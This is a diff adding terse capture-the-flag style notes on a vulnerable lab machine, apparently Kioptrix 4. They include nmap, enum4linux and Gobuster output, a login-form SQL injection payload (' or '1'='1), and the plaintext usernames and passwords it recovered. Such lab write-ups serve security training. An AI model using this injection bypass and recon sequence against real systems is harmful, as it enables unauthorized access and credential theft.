@@ -6,3 +6,44 @@ nmap -sV -O -Pn 192.168.111.133
   80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
   139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+enum4linux -a 192.168.111.133
+  KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
+  KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
+  KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
+  ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+  WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+  WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+  WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+ 
+Nikto nada
+
+Gobuster
+  /images (Status: 301)
+  /member (Status: 302)
+  /index (Status: 200)
+  /logout (Status: 302)
+  /john (Status: 301)
+  /robert (Status: 301)
+  /server-status (Status: 403)
+  /.htaccess (Status: 403)
+  /.htpasswd (Status: 403)
+  /.hta (Status: 403)
+  /cgi-bin/ (Status: 403)
+  /index (Status: 200)
+  /index.php (Status: 200)
+  /images (Status: 301)
+  /john (Status: 301)
+  /member (Status: 302)
+  /logout (Status: 302)
+  /server-status (Status: 403)
+  
+En el formulario de la web
+john / robert
+' or '1'='1
+
+Username 	: 	john
+Password 	: 	MyNameIsJohn
+
+Username 	: 	robert
+Password 	: 	ADGAdsafdfwt4gadfga==
